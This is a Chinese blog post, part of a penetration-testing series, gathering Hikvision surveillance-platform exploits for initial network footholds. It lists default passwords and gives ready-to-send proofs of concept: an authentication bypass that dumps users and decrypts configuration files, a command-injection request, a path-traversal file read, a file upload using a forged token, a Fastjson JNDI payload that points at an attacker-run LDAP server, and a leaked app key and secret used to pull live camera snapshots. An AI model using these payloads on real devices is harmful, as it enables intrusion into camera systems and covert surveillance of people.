class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">ZLARYY @ ZLARYY</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">497k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">7:32</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
+<h2 id="海康威视"><a class="anchor" href="#海康威视">#</a> 海康威视</h2>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/E6flzm2_3UmK62P0BuMxEg">海康威视常见漏洞汇总</a></p>
+<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/1788343.html">【漏洞总结】海康威视八大漏洞汇总 | CN-SEC 中文网</a></p>
+<p>海康威视是以视频为核心的只能物联网解决方案和大数据服务提供商，专注安防、智慧业务及创新技术应用，其核心业务包括<strong>视频监控系统</strong>，<strong>综合安防产品</strong>，<strong>智能物联网与大数据服务</strong>，<strong>创新业务</strong></p>
+<h3 id="默认口令-3"><a class="anchor" href="#默认口令-3">#</a> 默认口令</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 海康威视综合安防管理平台</span></span>
+<span class="line"><span>admin</span></span>
+<span class="line"><span>Abc123++</span></span>
+<span class="line"><span># 海康威视群组对讲服务配置平台</span></span>
+<span class="line"><span>admin</span></span>
+<span class="line"><span>12345</span></span>
+<span class="line"><span># 海康威视联网网关</span></span>
+<span class="line"><span>admin</span></span>
+<span class="line"><span>12345</span></span>
+<span class="line"><span># 海康威视 流媒体</span></span>
+<span class="line"><span>admin</span></span>
+<span class="line"><span>12345</span></span>
+<span class="line"><span># hikvision(ssh)</span></span>
+<span class="line"><span>admin</span></span>
+<span class="line"><span>121345</span></span>
+<span class="line"><span># Haivision Makito X Decoder(web)</span></span>
+<span class="line"><span>admin</span></span>
+<span class="line"><span>manager</span></span></code></pre>
+<h3 id="海康威视配置文件解码-cve-2017-7921"><a class="anchor" href="#海康威视配置文件解码-cve-2017-7921">#</a> 海康威视配置文件解码 CVE-2017-7921</h3>
+<p>影响范围：</p>
+<table>
+<thead>
+<tr>
+<th><strong>产品类型</strong></th>
+<th><strong>影响版本</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DS-2CD2x20(B/C/D)、DS-2CD3x20(B/C/D)</td>
+<td>V5.3.1 build150417-V5.4.23 build161020</td>
+</tr>
+<tr>
+<td>DS-2CD3x10(C)</td>
+<td>V5.4.0 build160415-V5.4.4 build161105</td>
+</tr>
+<tr>
+<td>DS-2CD4x2xFWD</td>
+<td>V5.2.0 build140721-V5.4.20 build160714</td>
+</tr>
+<tr>
+<td>DS-2CD5x</td>
+<td>V5.3.2 build150515-V5.4.4 build161022</td>
+</tr>
+<tr>
+<td>DS-2CD2xx5、DS-2CD3xx5</td>
+<td>V5.3.1 build150410-V5.3.3 build150613</td>
+</tr>
+<tr>
+<td>V5.3.5 build150906-V5.4.23 build161020</td>
+<td></td>
+</tr>
+<tr>
+<td>DS-2DEx、DS-2DFx</td>
+<td>V5.3.1 build150527-V5.4.4 build160927</td>
+</tr>
+</tbody>
+</table>
+<p>查看系统所有存在用户列表：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/Security/users?auth=YWRtaW46MTEKYWRtaW46MTEK</span></span></code></pre>
+<p><code>YWRtaW46MTEKYWRtaW46MTEK</code>是<code>admin:11</code>的base64编码</p>
+<p>获取系统监控快照，不需要身份验证：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/onvif-http/snapshot?auth=YWRtaW46MTEK</span></span></code></pre>
+<p>下载摄像机配置文件，通过脚本解密配置文件获得账密信息：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/System/configurationFile?auth=YWRtaW46MTEK</span></span></code></pre>
+<p>解密工具及命令：<a target="_blank" rel="noopener" href="https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor">https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor</a></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>python3 decrypt_configurationFile.py configurationFile</span></span></code></pre>
+<h3 id="命令注入漏洞-cve-2021-36260"><a class="anchor" href="#命令注入漏洞-cve-2021-36260">#</a> 命令注入漏洞 CVE-2021-36260</h3>
+<ul>
+<li>易受攻击的网络摄像机固件</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>产品类型</strong></th>
+<th><strong>影响版本</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IPC_E0</td>
+<td>IPC_E0_CN_STD_5.4.6_180112</td>
+</tr>
+<tr>
+<td>IPC_E1</td>
+<td>未知</td>
+</tr>
+<tr>
+<td>IPC_E2</td>
+<td>IPC_E2_EN_STD_5.5.52_180620</td>
+</tr>
+<tr>
+<td>IPC_E4</td>
+<td>未知</td>
+</tr>
+<tr>
+<td>IPC_E6</td>
+<td>IPCK_E6_EN_STD_5.5.100_200226</td>
+</tr>
+<tr>
+<td>IPC_E7</td>
+<td>IPCK_E7_EN_STD_5.5.120_200604</td>
+</tr>
+<tr>
+<td>IPC_G3</td>
+<td>IPC_G3_EN_STD_5.5.160_210416</td>
+</tr>
+<tr>
+<td>IPC_G5</td>
+<td>IPC_G5_EN_STD_5.5.113_210317</td>
+</tr>
+<tr>
+<td>IPC_H1</td>
+<td>IPC_H1_EN_STD_5.4.61_181204</td>
+</tr>
+<tr>
+<td>IPC_H5</td>
+<td>IPCP_H5_EN_STD_5.5.85_201120</td>
+</tr>
+<tr>
+<td>IPC_H8</td>
+<td>Factory installed firmware mid 2021</td>
+</tr>
+<tr>
+<td>IPC_R2</td>
+<td>IPC_R2_EN_STD_V5.4.81_180203</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>易受攻击的 PTZ 摄像机固件</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>产品类型</strong></th>
+<th><strong>影响版本</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IPD_E7</td>
+<td>IPDEX_E7_EN_STD_5.6.30_210526</td>
+</tr>
+<tr>
+<td>IPD_G3</td>
+<td>IPDES_G3_EN_STD_5.5.42_210106</td>
+</tr>
+<tr>
+<td>IPD_H5</td>
+<td>IPD_H5_EN_STD_5.5.41_200911</td>
+</tr>
+<tr>
+<td>IPD_H7</td>
+<td>IPD_H7_EN_STD_5.5.40_200721</td>
+</tr>
+<tr>
+<td>IPD_H8</td>
+<td>IPD_H8_EN_STD_5.7.1_210619</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>易受攻击的旧固件</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>产品类型</strong></th>
+<th><strong>影响版本</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IPC_R7</td>
+<td>5.4.x</td>
+</tr>
+<tr>
+<td>IPD_R7</td>
+<td>5.4.x</td>
+</tr>
+<tr>
+<td>IPC_G0</td>
+<td>5.4.x</td>
+</tr>
+<tr>
+<td>IPC_H3</td>
+<td>5.4.x</td>
+</tr>
+<tr>
+<td>IPD_H3</td>
+<td>5.4.x</td>
+</tr>
+</tbody>
+</table>
+<p>poc：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>PUT /SDK/webLanguage HTTP/1.1</span></span>
+<span class="line"><span>Host: x.x.x.x</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span></span>
+<span class="line"><span>AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span></span>
+<span class="line"><span>Accept: */*</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.9</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Content-Length: 89</span></span>
+<span class="line"><span>&#x3C;?xml version="1.0"</span></span>
+<span class="line"><span>encoding="UTF-8"?>&#x3C;language>$(ifconfig -a ></span></span>
+<span class="line"><span>webLib/dd.asp)&#x3C;/language></span></span></code></pre>
+<h3 id="任意文件读取漏洞-cve-2021-14544"><a class="anchor" href="#任意文件读取漏洞-cve-2021-14544">#</a> 任意文件读取漏洞 CVE-2021-14544</h3>
+<p>影响范围为流媒体管理服务器 V2.3.5</p>
+<p>poc：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini</span></span></code></pre>
+<h3 id="任意文件上传漏洞"><a class="anchor" href="#任意文件上传漏洞">#</a> 任意文件上传漏洞</h3>
+<p>影响范围为iVMS-8700综合安防</p>
+<p>poc：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1</span></span>
+<span class="line"><span>Host: your-ip</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span></span>
+<span class="line"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988</span></span>
+<span class="line"><span>Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo</span></span>
+<span class="line"><span>Upgrade-Insecure-Requests: 1</span></span>
+<span class="line"><span>Content-Length: 174</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>------WebKitFormBoundaryGEJwiloiPo</span></span>
+<span class="line"><span>Content-Disposition: form-data; name="fileUploader";filename="1.jsp"</span></span>
+<span class="line"><span>Content-Type: image/jpeg</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>test</span></span>
+<span class="line"><span>------WebKitFormBoundaryGEJwiloiPo</span></span></code></pre>
+<p>token处的内容是：<code>url+secretKeyIbuilding</code>的大写32位MD5值</p>
+<p>构造token绕过机制，如果token值与<code>url+secretkey</code>的md5值相同就可以绕过认证</p>
+<p>secretkey是代码里写死的，默认值<code>secretKeybuilding</code></p>
+<h3 id="fastjson远程命令执行漏洞"><a class="anchor" href="#fastjson远程命令执行漏洞">#</a> Fastjson远程命令执行漏洞</h3>
+<p>影响范围为海康威视综合安防管理平台</p>
+<p>poc：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /bic/ssoService/v1/applyCT HTTP/1.1</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0)</span></span>
+<span class="line"><span>Gecko/20100101 Firefox/104.0</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Host: 127.0.0.1</span></span>
+<span class="line"><span>Accept-Language:</span></span>
+<span class="line"><span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
+<span class="line"><span>Dnt: 1</span></span>
+<span class="line"><span>Upgrade-Insecure-Requests: 1</span></span>
+<span class="line"><span>Sec-Fetch-Dest: document</span></span>
+<span class="line"><span>Sec-Fetch-Mode: navigate</span></span>
+<span class="line"><span>Sec-Fetch-Site: cross-site</span></span>
+<span class="line"><span>Sec-Fetch-User: ?1</span></span>
+<span class="line"><span>Te: trailers</span></span>
+<span class="line"><span>Content-Type: application/json</span></span>
+<span class="line"><span>Content-Length: 196</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#123;"a":&#123;"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"&#125;,"b":&#123;"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.dnslog.cn","autoCommit":true&#125;,"hfe4zyyzldp":"="&#125;</span></span></code></pre>
+<p>确定dnslog能收到请求之后，使用工具JNDIExploit-1.2-SNAPSHOT.jar 进一步利用。把该工具上传到公网服务器后，执行如下命令：</p>
+<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/0x727/JNDIExploit">GitHub - 0x727/JNDIExploit: 一款用于JNDI注入利用的工具，大量参考/引用了Rogue JNDI项目的代码，支持直接植入内存shell，并集成了常见的bypass 高版本JDK的方式，适用于与自动化工具配合使用。 · GitHub</a></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 你的公网服务器ip</span></span></code></pre>
+<p>需要开放1389 8080端口，然后就在数据包的头部加上<code>cmd: whoami</code>，存在注入的地方改成<code>load://[IP]:1389/Basic/TomcatEcho</code>：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /bic/ssoService/v1/applyCT HTTP/1.1</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
+<span class="line"><span>Connection: keep-alive</span></span>
+<span class="line"><span>Host: 127.0.0.1</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Dnt: 1</span></span>
+<span class="line"><span>Upgrade-Insecure-Requests: 1</span></span>
+<span class="line"><span>Sec-Fetch-Dest: document</span></span>
+<span class="line"><span>Sec-Fetch-Mode: navigate</span></span>
+<span class="line"><span>Sec-Fetch-Site: cross-site</span></span>
+<span class="line"><span>Sec-Fetch-User: ?1</span></span>
+<span class="line"><span>Te: trailers</span></span>
+<span class="line"><span>Content-Type: application/json</span></span>
+<span class="line"><span>cmd: whoami</span></span>
+<span class="line"><span>Content-Length: 215</span></span>
+<span class="line"><span>&#123;"a":&#123;"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"&#125;,"b":&#123;"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://这里是的你公网服务器ip地址:1389/Basic/TomcatEcho","autoCommit":true&#125;,"hfe4zyyzldp":"="&#125;</span></span></code></pre>
+<h3 id="海康威视ak信息泄露漏洞"><a class="anchor" href="#海康威视ak信息泄露漏洞">#</a> 海康威视AK信息泄露漏洞</h3>
+<p>存在jsconfig的调用，appkey是user，由一个8位数数构成：23412412</p>
+<p>Secret就是passwd，由21位的密钥构成：<code>QfQPss5GOac9Bjxkfuv3</code></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 获取权限的编码设备列表</span></span>
+<span class="line"><span>/api/resource/v2/encodeDevice/search</span></span>
+<span class="line"><span># 获取cameraIndexCode</span></span>
+<span class="line"><span>/api/resource/v1/cameras</span></span>
+<span class="line"><span># 带cameraIndexCode去获取摄像头的Picurl</span></span>
+<span class="line"><span>/api/video/v1/manualCapture</span></span></code></pre>
+<p>获取到的picUrl直接访问就是摄像头的画面</p>
+</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-08-19 17:03:02" itemprop="dateModified" datetime="2026-08-19T17:03:02+08:00">2026-08-19</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>ZLARYY<i class="ic i-at"><em>@</em></i>欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~</li><li class="link"><strong>本文链接：</strong><a href="https://zlaryy.top/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/" title="常规外网打点-PART3">https://zlaryy.top/2026/08/17/常规外网打点-PART3/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2026/08/04/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART2/" rel="prev" itemprop="url" data-background-image="&#x2F;assets&#x2F;picture4.webp" title="常规外网打点-PART2"><span class="type">上一篇</span><h3>常规外网打点-PART2</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-part3%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD"><span class="toc-number">1.</span> <span class="toc-text"> 常规外网打点-PART3（持续更新中......）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#oa"><span class="toc-number">2.</span> <span class="toc-text"> OA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEoa"><span class="toc-number">2.1.</span> <span class="toc-text"> 泛微OA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 指纹识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 文件上传漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.3.</span> <span class="toc-text"> SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%85%A8%E7%89%88%E6%9C%AC%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.4.</span> <span class="toc-text"> 未授权访问漏洞（全版本默认配置）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.5.</span> <span class="toc-text"> 命令注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.6.</span> <span class="toc-text"> Hessian反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEoa"><span class="toc-number">2.2.</span> <span class="toc-text"> 通达OA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 文件上传与包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-2"><span class="toc-number">2.2.2.</span> <span class="toc-text"> SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#id%E5%8F%82%E6%95%B0%E5%AD%98%E5%9C%A8sqli%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.2.1.</span> <span class="toc-text"> id参数存在sqli注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#starttime%E5%8F%82%E6%95%B0"><span class="toc-number">2.2.2.2.</span> <span class="toc-text"> starttime参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#orderby%E5%8F%82%E6%95%B0"><span class="toc-number">2.2.2.3.</span> <span class="toc-text"> orderby参数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#down%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.2.3.</span> <span class="toc-text"> down接口信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#video_filephp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.4.</span> <span class="toc-text"> video_file.php任意文件下载漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get_contactlistphp"><span class="toc-number">2.2.5.</span> <span class="toc-text"> get_contactlist.php</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%86%85%E7%BD%91web%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.</span> <span class="toc-text"> 常见内网web服务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nacos"><span class="toc-number">3.1.</span> <span class="toc-text"> Nacos</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96nacos%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">3.1.1.</span> <span class="toc-text"> 获取nacos版本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4"><span class="toc-number">3.1.2.</span> <span class="toc-text"> 默认口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E6%9C%AA%E5%BC%80%E5%90%AF%E9%89%B4%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">3.1.3.</span> <span class="toc-text"> 默认未开启鉴权-未授权查看用户信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-agent%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87cve-2021-29441"><span class="toc-number">3.1.4.</span> <span class="toc-text"> User-Agent权限绕过（CVE-2021-29441）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4jwt%E5%AF%86%E9%92%A5-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">3.1.5.</span> <span class="toc-text"> 默认JWT密钥-未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#derby%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">3.1.6.</span> <span class="toc-text"> Derby未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nacos-client-yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.7.</span> <span class="toc-text"> Nacos Client Yaml反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nacos-hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.8.</span> <span class="toc-text"> Nacos Hessian反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nacos-rce"><span class="toc-number">3.1.9.</span> <span class="toc-text"> Nacos RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.1.10.</span> <span class="toc-text"> 密码破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nacos%E5%AF%86%E7%A0%81bcypt"><span class="toc-number">3.1.10.1.</span> <span class="toc-text"> nacos密码bcypt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%AF%86%E6%96%87jasypt"><span class="toc-number">3.1.10.2.</span> <span class="toc-text"> 配置文件密文jasypt</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.11.</span> <span class="toc-text"> 常用命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxl-job"><span class="toc-number">3.2.</span> <span class="toc-text"> XXL-JOB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4-2"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 默认口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.2.2.</span> <span class="toc-text"> Hessian反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.2.1.</span> <span class="toc-text"> 出网利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.2.2.</span> <span class="toc-text"> 不出网利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.2.3.</span> <span class="toc-text"> 后台命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#executor%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.2.4.</span> <span class="toc-text"> Executor未授权命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4accesstoken%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.5.</span> <span class="toc-text"> 默认accessToken身份绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0ssrf"><span class="toc-number">3.2.6.</span> <span class="toc-text"> 后台SSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%8D%8E"><span class="toc-number">3.3.</span> <span class="toc-text"> 大华</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%91%84%E5%83%8F%E5%A4%B4%E4%B8%8Envr%E8%AE%BE%E5%A4%87%E7%AB%AF%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.1.</span> <span class="toc-text"> 摄像头与NVR设备端漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9Ecve-2021-33044-cve-2021-33045"><span class="toc-number">3.3.1.1.</span> <span class="toc-text"> 身份验证绕过漏洞CVE-2021-33044 &amp; CVE-2021-33045</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 